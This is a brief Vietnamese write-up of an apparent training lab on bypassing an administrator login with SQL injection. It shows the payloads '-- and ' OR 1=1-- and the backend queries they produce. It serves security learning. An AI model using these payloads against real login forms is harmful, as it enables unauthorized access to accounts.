![SQLi Lab](images/Pasted%20image%2020260520185130.png)
# Tổng quan về lab
-Mục tiêu là làm sao để bypass đăng nhập vào tài khoản administrator
Thường thường khi đăng nhập kết nối với MySQL ta biết SQL có câu truy vấn
```SQL
SELECT * FROM users 
WHERE username = 'administrator' AND password = 'kobietmatkhau'
```
Nếu query trả về kết quả => đăng nhập thành công
# Khai thác
**Cách 1:**
-Với query trên:
```SQL
SELECT * FROM users 
WHERE username = 'administrator' AND password = 'kobietmatkhau'
```
bằng cách thêm `'--` trước administrator 
![SQLi Lab](images/Pasted%20image%2020260520185721.png)
Lúc này câu query Backend trở thành:
```SQL
SELECT * FROM users 
WHERE username = 'administrator'--' AND password = 'kobietmatkhau'
```
=> Database sẽ trả về users có username là administrator 
=> Thành công bypass SQLi
**Cách 2:**
Với query trên:
```SQL
SELECT * FROM users 
WHERE username = 'administrator' AND password = 'kobietmatkhau'
```
bằng cách thêm `' OR 1=1--` trước administrator hoặc password
![SQLi Lab](images/Pasted%20image%2020260520190140.png)
Lúc này câu query Backend trở thành:
```SQL
SELECT * FROM users 
WHERE username = 'administrator' OR 1=1--' AND password = 'kobietmatkhau'
-- hay
SELECT * FROM users 
WHERE username = 'administrator' AND password = 'kobietmatkhau 'OR 1=1--
```
Vì 1=1 luôn đúng nên query nên:
=> Database sẽ trả về users có username là administrator 
=> Thành công bypass SQLi
